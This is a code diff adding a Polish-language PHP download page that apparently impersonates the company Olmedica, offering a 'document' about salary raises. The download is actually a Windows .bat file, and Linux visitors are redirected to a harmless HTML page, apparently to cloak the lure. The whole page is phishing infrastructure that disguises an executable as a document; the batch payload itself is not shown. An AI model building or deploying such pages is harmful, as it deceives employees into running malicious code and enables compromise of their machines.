@@ -1,0 +1,36 @@
+<?php
+
+$platform = strtolower($_SERVER['HTTP_SEC_CH_UA_PLATFORM'] ?? '');
+
+if (strpos($platform, 'linux') !== false) {
+    header("Location: https://olmedica.pl/pliki_do_porbania/podwyzki_olmedica.html");
+    exit;
+}
+
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Dokument</title>
+</head>
+
+<body style="font-family: Arial; text-align:center; margin-top:50px;">
+
+<p>
+<img src="../pliki_do_porbania/logo_olmedica.png" alt="Olmedica" style="max-width:150px; height:auto;">
+</p>
+
+<h2>Dokument do pobrania</h2>
+
+<p>Kliknij przycisk, aby pobrać dokument:</p>
+
+<p>
+<a href="podwyzki_olmedica.bat" download style="padding:10px 20px; font-size:16px; text-decoration:none; background-color:#0078d4; color:white; border-radius:5px;">
+Pobierz dokument
+</a>
+</p>
+
+</body>
+</html>
